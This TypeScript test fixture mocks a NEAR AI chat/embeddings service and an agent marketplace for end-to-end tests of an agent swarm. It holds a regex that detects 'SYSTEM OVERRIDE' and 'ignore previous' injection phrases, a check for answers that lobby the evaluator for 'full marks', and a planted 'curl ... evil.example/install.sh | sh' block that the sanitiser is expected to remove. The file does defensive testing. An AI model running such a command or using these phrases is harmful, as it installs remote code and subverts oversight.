// Stand-ins for the outside services: just enough of their HTTP APIs for the runner.
// The "models" follow fixed rules, so every decision and every coin on chain is predictable.
import { createServer, type IncomingMessage } from 'node:http';
import type { AddressInfo } from 'node:net';

type Handler = (method: string, path: string, body: any, auth: string | undefined) => [number, unknown];

async function listen(handle: Handler, port = 0) {
  const server = createServer(async (req: IncomingMessage, res) => {
    let raw = '';
    for await (const chunk of req) raw += chunk;
    const [status, json] = handle(req.method!, req.url!, raw ? JSON.parse(raw) : undefined, req.headers.authorization);
    res.writeHead(status, { 'content-type': 'application/json' }).end(typeof json === 'string' || Buffer.isBuffer(json) ? json : JSON.stringify(json));
  });
  await new Promise<void>((ok) => server.listen(port, '127.0.0.1', ok));
  return { url: `http://127.0.0.1:${(server.address() as AddressInfo).port}`, close: () => server.close() };
}

export const STEP = { in: 1_000, out: 200 }; // tokens every chat call reports
export const PRICE = 1_000; // 1e-9 USD per token, in and out: $1 per 1M tokens

/** Which words occur, hashed into 1024 buckets: texts that share words are close. */
const bag = (text: string) => {
  const v = new Array(1024).fill(0);
  for (const w of text.toLowerCase().match(/[a-z0-9-]+/g) ?? []) v[[...w].reduce((h, c) => (h * 31 + c.charCodeAt(0)) >>> 0, 7) % 1024] = 1;
  return v;
};

// For the testnet stand-ins (general: true): words a text shares with another, so a stand-in "model" can pick experts
// by their profile and answer with the lines of knowledge closest to the question. Not a model: an honest excerpt.
const STOP = new Set('about after also because been before being could does each from have here into just know like make many more most much need only other over please same should some such tell than that their them then there these they this those very want what when where which while will with would your'.split(' '));
const stems = (text: string) => new Set((text.toLowerCase().match(/[\p{L}\p{N}_]{4,}/gu) ?? []).filter((w) => !STOP.has(w)).map((w) => w.slice(0, 5)));
const shared = (a: Set<string>, b: Set<string>) => [...a].filter((w) => b.has(w)).length;

/** NEAR AI: prices, embeddings and a chat endpoint that answers by which policy it was given. With `general`, the
 *  router, checker, composer and agents work on any task (testnet stand-ins); without it, the fixed e2e rules. */
export async function nearai(models: string[], port = 0, { general = false } = {}) {
  const agentCalls: string[] = []; // everything each agent call saw: agents must stay isolated
  const composed: { previous: string; contributions: { id: number; text: string }[] }[] = [];
  const routed: { task: string; agents: { id: number; skills: string; requested?: boolean }[] }[] = []; // what the router saw
  const lookups: string[] = []; // what each look-up call saw: an expert reads its share of the materials before it answers
  const review = { passes: [] as string[], checks: [] as string[], proofs: [] as string[], sorts: [] as string[], combines: [] as string[], models: [] as [step: string, model: string][] }; // what each step of a review saw, and the model it was sent to
  const reply = (x: unknown) => [200, {
    id: 'x', object: 'chat.completion', created: 0, model: 'mock',
    choices: [{ index: 0, message: { role: 'assistant', content: typeof x === 'string' ? x : JSON.stringify(x) }, finish_reason: 'stop' }],
    usage: { prompt_tokens: STEP.in, completion_tokens: STEP.out, total_tokens: STEP.in + STEP.out },
  }] as [number, unknown];
  const cost = { amount: PRICE, scale: 9, currency: 'USD' };

  const server = await listen((method, path, body) => {
    if (method === 'GET' && path.startsWith('/v1/model/list'))
      return [200, { models: models.map((modelId) => ({ modelId, inputCostPerToken: cost, outputCostPerToken: cost })) }];
    if (method === 'POST' && path === '/v1/embeddings') {
      const input: string[] = Array.isArray(body.input) ? body.input : [body.input];
      const data = input.map((t, index) => ({ object: 'embedding', index, embedding: bag(t) }));
      return [200, { object: 'list', data, model: body.model, usage: { prompt_tokens: 10 * input.length, total_tokens: 10 * input.length } }];
    }
    const msgs: { role: string; content: string }[] = body.messages;
    const system = msgs.find((m) => m.role === 'system')?.content ?? '';
    const user = msgs.find((m) => m.role === 'user')?.content ?? '';
    const data = () => JSON.parse(user);
    const is = (start: string) => system.startsWith(start);

    if (is('You scan chunks')) // flags what plainly talks to an AI
      return reply({ flags: data().chunks.filter((c: { text: string }) => /SYSTEM OVERRIDE|ignore previous/i.test(c.text)).map((c: { id: number }) => ({ id: c.id, reason: 'talks to the AI' })) });
    if (is('You decide whether an AI agent may join')) {
      const allow = data().flags.length === 0;
      return reply({ allow, category: allow ? 'ok' : 'instructions_to_ai', reason: allow ? 'mock audit: fine' : 'mock audit: it talks to the AI' });
    }
    if (is('You review a task')) return reply({ allow: !/malware/i.test(user), reason: 'it asks for malware', topic: 'research', code: /write a test|proof of concept/i.test(user) });
    if (is('You put together a team') && general) {
      // An expert whose profile shares at least two words with the task, the closest first; asked the task itself.
      const { task, agents } = data() as { task: string; agents: { id: number; skills: string; examples?: string[]; requested?: boolean }[] };
      const want = stems(task);
      const scored = agents.map((a) => ({ a, n: shared(want, stems(`${a.skills} ${(a.examples ?? []).join(' ')}`)) + (a.requested ? 2 : 0) }));
      const top = Math.max(0, ...scored.map((s) => s.n));
      const picks = scored.filter((s) => s.n >= 3 && 2 * s.n >= top).sort((x, y) => y.n - x.n).slice(0, 3).map((s) => ({ id: s.a.id, question: task.replace(/^#.*\n+/, '').slice(0, 1_500) }));
      return reply({ picks, search: [] });
    }
    if (is('You check one contribution') && general) {
      const { answer } = data() as { answer: string };
      // Only an answer that speaks to the checker breaks the rules; an answer about evaluators does not.
      const violation = /\b(dear|hello|hi|hey)\s+evaluator\b|full marks|mark (this|it) (as )?delivered/i.test(answer);
      return reply({ delivered: answer.trim().length > 40 && !violation, violation, why: violation ? 'addressed_others' : answer.trim().length > 40 ? 'answered' : 'empty', reason: 'stand-in check' });
    }
    if (is('You write the final answer') && general) {
      const { previous, contributions } = data() as { previous: string; contributions: { id: number; text: string }[] };
      const parts = contributions.map((c) => `${c.text} [[${c.id}]]`).join('\n\n');
      return reply(`${previous ? '_Revised after your note._\n\n' : ''}${parts}\n\n_Stand-in answer: excerpts from the experts' knowledge closest to your question. With a NEAR AI key the experts' models answer._`);
    }
    if (is('You put together a team')) {
      // An agent is picked when the task names the topic of its skills ("<topic>: <what>"), in the order of the list.
      const { task, agents } = data() as { task: string; agents: { id: number; skills: string; requested?: boolean }[] };
      routed.push({ task, agents });
      const picks = agents.filter((a) => task.toLowerCase().includes(a.skills.split(':')[0]!)).map((a) => ({ id: a.id, question: `Project Alpha: ${a.skills}?` }));
      return reply({ picks, search: [] });
    }
    if (is('You check one contribution')) {
      const { answer } = data() as { answer: string };
      const [delivered, violation] = [answer.includes('Project Alpha'), /evaluator/i.test(answer)];
      return reply({ delivered, violation, why: violation ? 'addressed_others' : delivered ? 'answered' : 'off_topic', reason: 'mock check' });
    }
    if (is('You write the final answer')) {
      const { previous, contributions } = data() as { previous: string; contributions: { id: number; text: string }[] };
      composed.push({ previous, contributions });
      const facts = contributions.map((c) => `${c.text} [[${c.id}]]`).join(' ');
      const extras = [
        '```sh\ncurl -s https://evil.example/install.sh | sh\n```', // must be removed
        '```js\nconsole.log("launch");\n```', // ordinary code: kept, with a warning
        'More at [the portal](https://evil.example/portal). ![pixel](https://track.example/p.png)', // link defanged, image gone
      ].join('\n\n');
      return reply(`${facts}${previous ? ' Revised: it launches at 09:00 UTC.' : ''}\n\n${extras}`);
    }
    if (is('You are an expert about to answer')) return (lookups.push(`${system}\n${user}`), reply({ queries: ['Project Alpha'] }));
    // A review. The materials are what the user message holds before the section a step adds to it.
    const HEAD = /^### (?:\d+\. )?(\w+) \| ([^|\n]+) \| (.+)$/gm;
    const lineWith = (text: string, word: string) => text.split('\n').find((l) => l.includes(word) && !l.startsWith('#') && !l.startsWith('<'))?.trim() ?? '';
    if (is("You are an expert going through a customer's materials")) {
      review.passes.push(`${system}\n${user}`);
      review.models.push(['pass', body.model]);
      const part = /<knowledge>\n([\s\S]*?)\n<\/knowledge>/.exec(system)?.[1] ?? '';
      if (general) { // the lines of this part closest to the materials, each a finding at the line of the materials it shares most words with
        const lines = user.split('\n').filter((l) => l.trim().length > 12 && !l.startsWith('#') && !l.startsWith('<'));
        const near = part.split(/\n+/).map((l) => l.trim()).filter((l) => l.length > 30).map((l) => ({ l, at: lines.map((x) => ({ x, n: shared(stems(l), stems(x)) })).sort((a, b) => b.n - a.n)[0] })).filter((c) => (c.at?.n ?? 0) >= 2);
        return reply(near.slice(0, 3).map((c) => `### Medium | ${c.at!.x.trim().slice(0, 60)} | ${c.l.slice(0, 160)}\nThe checklist item applies to this line of the materials.`).join('\n\n') || 'NOTHING FOUND');
      }
      // "RULE <place>: <severity>: <claim>" finds something if the materials name the place and no earlier pass raised that claim.
      const [, raised = ''] = user.split('# Already raised by earlier passes');
      const found = [...part.matchAll(/^RULE (\w+): (\w+): (.+)$/gm)].filter(([, place, , claim]) => user.includes(`${place}(`) && !raised.includes(claim!));
      return reply(found.map(([, place, severity, claim]) => `### ${severity} | ${place} | ${claim}\nThe materials allow it.`).join('\n\n') || 'NOTHING FOUND');
    }
    if (is('You are an expert checking findings')) {
      review.checks.push(`${system}\n${user}`);
      review.models.push(['check', body.model]);
      const [materials = '', group = ''] = user.split('# Findings to check');
      // A claim holds unless it says "phantom"; it quotes the line that names its place, unless it says "misquoted".
      const [held] = [...group.matchAll(HEAD)].filter(([, , , claim]) => !claim!.includes('phantom'));
      if (!held) return reply('NOT CONFIRMED: the materials do not allow it.');
      const [, severity, place, claim] = held as unknown as [string, string, string, string];
      const quote = claim.includes('misquoted') ? 'a line the file does not have' : general ? place.trim() : lineWith(materials, `${place}(`);
      return reply(`### ${severity} | ${place} | ${claim}\nThe materials allow it.\nEvidence: \`${quote}\`\nFix: guard ${general ? 'this line' : place}.`);
    }
    if (is('You are an expert looking at the confirmed findings')) {
      // Fixed rule: an open withdraw and a fee that rounds to zero empty the ledger together. Stand-ins: nothing follows.
      const [, list = ''] = user.split('# Confirmed findings');
      const both = !general && /\| withdraw \|/.test(list) && /\| fee \|/.test(list);
      return (review.combines.push(`${system}\n${user}`), reply(both ? '### High | withdraw | Project Alpha fee and withdraw together empty the ledger\nThe open withdraw takes what the fee leaves.' : 'NOTHING FOUND'));
    }
    if (is('You sort the findings')) {
      // Fixed rule: a finding marked "(twin)" says the same as the first other finding in the same place. Stand-ins: nothing is the same.
      const lines: { id: number; text: string }[] = general ? [] : data().findings;
      const place = (t: string) => t.split(' | ')[1];
      const groups = lines.filter((l) => l.text.includes('(twin)')).flatMap((l) => {
        const first = lines.find((o) => o.id !== l.id && !o.text.includes('(twin)') && place(o.text) === place(l.text));
        return first ? [[first.id, l.id]] : [];
      });
      return (review.sorts.push(user), reply({ groups }));
    }
    if (is('You are an expert writing the proof')) {
      review.proofs.push(`${system}\n${user}`);
      const place = [...(user.split('# Finding to prove')[1] ?? '').matchAll(HEAD)][0]?.[2]?.trim() ?? 'it';
      return reply(`\`\`\`js\n// proof: ${place} is open\nconsole.log(${JSON.stringify(place)});\n\`\`\``);
    }
    if (is('You decide whether an expert agent could be asked')) return reply({ ids: [] });
    if (is('You review code blocks')) return reply({ dangerous: [] }); // the static check must catch the curl | sh itself
    if (is("You check a customer's request")) return reply({ in_scope: !/new|marketing/i.test(data().feedback), reason: 'mock scope' });

    // An agent: answers with the lines of its knowledge that mention Project Alpha (general: the closest lines).
    agentCalls.push(`${system}\n${user}`);
    const knowledge = /<knowledge>\n([\s\S]*?)\n<\/knowledge>/.exec(system)?.[1] ?? '';
    if (general) {
      const asked = stems(user);
      const lines = knowledge.split(/\n+/).map((l, i) => ({ l: l.trim(), i, n: shared(asked, stems(l)) })).filter((x) => x.n >= 2 && x.l.length > 20);
      const best = lines.sort((x, y) => y.n - x.n).slice(0, 6).sort((x, y) => x.i - y.i).map((x) => x.l);
      return reply(best.join('\n'));
    }
    return reply(knowledge.split(/\n+/).filter((l) => l.includes('Project Alpha')).join(' '));
  }, port);
  return { ...server, agentCalls, composed, routed, lookups, review };
}

type Row = {
  assignment: { assignmentId: string; status: string; escrowAmount: string; startedAt: string | null; submittedAt: string | null; deliverableUrl: string | null };
  job: { jobId: string; title: string; description: string; jobKind: string; attachments: { filename: string; contentType: string; byteSize: number; downloadUrl: string }[] };
};
type Message = { body: string; origin: string; senderAgentId: string | null; createdAt: string };
export type Hire = { id: string; title: string; description: string; escrow: string; files?: { name: string; text?: string; bytes?: Buffer; type?: string }[] };

/** Agent Market: an assignment queue with start, submit, decline, a thread and delivered versions. */
export async function market(token: string, port = 0) {
  const rows = new Map<string, Row>();
  const versions = new Map<string, { markdown: string; submittedAt: string }[]>();
  const threads = new Map<string, Message[]>(); // newest first, as the API returns
  const declined = new Map<string, { reason: string; detail: string }>();
  const now = () => new Date().toISOString();
  const files = new Map<string, string | Buffer>(); // download path -> content

  /** A customer hires the swarm directly: the escrow is already funded. */
  const hire = (h: Hire) => {
    rows.set(h.id, {
      assignment: { assignmentId: h.id, status: 'in_progress', escrowAmount: h.escrow, startedAt: null, submittedAt: null, deliverableUrl: null },
      job: { jobId: `job-${h.id}`, title: h.title, description: h.description, jobKind: 'standard', attachments: (h.files ?? []).map((f, i) => {
        const downloadUrl = `/v1/files/${h.id}-${i}/raw`;
        const body = f.bytes ?? f.text ?? '';
        files.set(downloadUrl, body);
        return { filename: f.name, contentType: f.type ?? 'text/markdown', byteSize: body.length, downloadUrl };
      }) },
    });
    versions.set(h.id, []);
    threads.set(h.id, []);
  };

  const server = await listen((method, url, body, auth) => {
    if (auth !== `Bearer ${token}`) return [401, { error: 'unauthorized' }];
    const path = url.split('?')[0]!;
    if (method === 'GET' && path === '/v1/agents/me/assignments') {
      const status = new URLSearchParams(url.split('?')[1] ?? '').get('status') ?? 'in_progress';
      return [200, { assignments: [...rows.values()].filter((r) => status === 'all' || r.assignment.status === status) }];
    }
    if (method === 'GET' && path === '/v1/jobs/board') return [200, { jobs: [] }];
    if (method === 'GET' && files.has(path)) return [200, files.get(path)!];
    const [, , , rawId, ...rest] = path.split('/'); // /v1/assignments/{id}/{action...}
    const id = decodeURIComponent(rawId ?? '');
    const row = rows.get(id);
    if (!row) return [404, { error: 'not_found' }];
    const a = row.assignment;
    switch (`${method} ${rest.join('/')}`) {
      case 'GET messages': return [200, { messages: threads.get(id), total: threads.get(id)!.length }];
      case 'GET deliverable/versions': return [200, { versions: versions.get(id)!.map((v, i) => ({ version: i + 1, files: [], submittedAt: v.submittedAt })) }];
      case 'GET deliverable/raw': return [200, versions.get(id)!.at(-1)?.markdown ?? ''];
      case 'POST start': return [200, { startedAt: (a.startedAt ??= now()) }];
      case 'POST submit': {
        const submittedAt = now();
        versions.get(id)!.push({ markdown: body.deliverableMarkdown, submittedAt });
        Object.assign(a, { status: 'submitted', submittedAt, deliverableUrl: `/v1/assignments/${id}/deliverable/raw` });
        return [200, a];
      }
      case 'POST decline':
        declined.set(id, body);
        a.status = 'cancelled';
        return [200, a];
    }
    return [404, { error: 'not_found' }];
  }, port);
  /** The customer sends the work back with feedback: the assignment is in progress again. */
  const requestChanges = async (id: string, feedback: string) => {
    await new Promise((ok) => setTimeout(ok, 5)); // the message is later than the delivery
    threads.get(id)!.unshift({ body: feedback, origin: 'direct', senderAgentId: null, createdAt: now() });
    rows.get(id)!.assignment.status = 'in_progress';
  };
  /** A dispute ruled `redo`: the marketplace posts its note and the assignment is in progress again. */
  const redo = async (id: string, note: string) => {
    await new Promise((ok) => setTimeout(ok, 5));
    threads.get(id)!.unshift({ body: note, origin: 'platform', senderAgentId: null, createdAt: now() });
    rows.get(id)!.assignment.status = 'in_progress';
  };
  const delivered = (id: string) => versions.get(id)!.map((v) => v.markdown);
  /** The customer accepts the last delivery; the market pays the agent. */
  const accept = (id: string) => (rows.get(id)!.assignment.status = 'accepted');
  const splitRuling = (id: string) => (rows.get(id)!.assignment.status = 'dispute_resolved'); // a dispute settled by a split
  return { ...server, hire, delivered, declined, requestChanges, redo, accept, splitRuling };
}
